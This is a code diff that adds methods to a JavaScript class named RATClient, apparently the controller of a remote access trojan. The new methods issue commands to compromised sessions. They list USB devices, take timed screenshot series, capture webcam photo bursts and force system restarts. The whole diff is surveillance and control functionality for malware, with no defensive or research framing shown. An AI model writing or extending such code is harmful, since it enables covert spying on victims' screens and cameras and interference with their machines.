@@ -545,6 +545,78 @@ export class RATClient {
     }
   }
 
+  /**
+   * Enumerate USB devices
+   */
+  async enumerateUSB(sessionId, timeout = 15000) {
+    try {
+      const result = await this.sendCommand(sessionId, 'usb', timeout);
+      
+      try {
+        const parsed = JSON.parse(result);
+        return { success: true, data: parsed };
+      } catch {
+        return { success: true, data: result };
+      }
+    } catch (error) {
+      return { success: false, error: error.message };
+    }
+  }
+
+  /**
+   * Screenshot timelapse
+   */
+  async screenshotTimelapse(sessionId, count = 5, interval = 5, timeout = null) {
+    try {
+      const calculatedTimeout = timeout || (count * interval * 1000) + 10000;
+      const result = await this.sendCommand(sessionId, `timelapse ${count} ${interval}`, calculatedTimeout);
+      
+      try {
+        const parsed = JSON.parse(result);
+        return { success: true, data: parsed };
+      } catch {
+        return { success: true, data: result };
+      }
+    } catch (error) {
+      return { success: false, error: error.message };
+    }
+  }
+
+  /**
+   * Take photo burst
+   */
+  async photoBurst(sessionId, count = 3, timeout = null) {
+    try {
+      const calculatedTimeout = timeout || (count * 2000) + 5000;
+      const result = await this.sendCommand(sessionId, `photoburst ${count}`, calculatedTimeout);
+      
+      try {
+        const parsed = JSON.parse(result);
+        return { success: true, data: parsed };
+      } catch {
+        return { success: true, data: result };
+      }
+    } catch (error) {
+      return { success: false, error: error.message };
+    }
+  }
+
+  /**
+   * Restart system
+   */
+  async restart(sessionId, timeout = 5000) {
+    try {
+      const result = await this.sendCommand(sessionId, 'shutdown restart', timeout);
+      
+      return {
+        success: !result.includes('error'),
+        data: result
+      };
+    } catch (error) {
+      return { success: false, error: error.message };
+    }
+  }
+
   // ═══════════════════════════════════════════════════════════════
   // FILE OPERATIONS
   // ═══════════════════════════════════════════════════════════════
